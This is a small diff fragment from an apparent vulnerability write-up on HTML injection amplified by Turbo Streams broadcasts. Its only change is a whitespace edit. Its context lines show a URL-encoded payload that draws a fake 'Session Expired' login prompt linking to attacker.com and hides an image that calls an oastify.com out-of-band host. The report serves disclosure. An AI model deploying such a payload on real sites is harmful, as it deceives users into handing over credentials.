@@ -38,8 +38,7 @@ The use of **Turbo Streams** amplifies the impact. Updates are pushed to all act
    ```html
    %22%3E%3Ch1%20style%3D%22color%3Ared%3Bfont-family%3Asans-serif%22%3ESession%20Expired%3C%2Fh1%3E%3Ca%20href%3D%22https%3A%2F%2Fattacker.com%22%20style%3D%22background%3Ared%3Bcolor%3Awhite%3Bpadding%3A10px%3Btext-decoration%3Anone%3Bborder-radius%3A5px%22%3ELogin%20Again%3C%2Fa%3E%3Cbr%3E%3Cimg%20src%3D%22https%3A%2F%2Fc5id6i5fep1tfce1y4o7xpl5cwin6fu4.oastify.com%22%20style%3D%22display%3Anone%22%3E%22
 
-
-   Forward the request. The payload renders strictly within the application context.
+Forward the request. The payload renders strictly within the application context.
 
 🖼️ Visual Evidence & OAST Verification
 
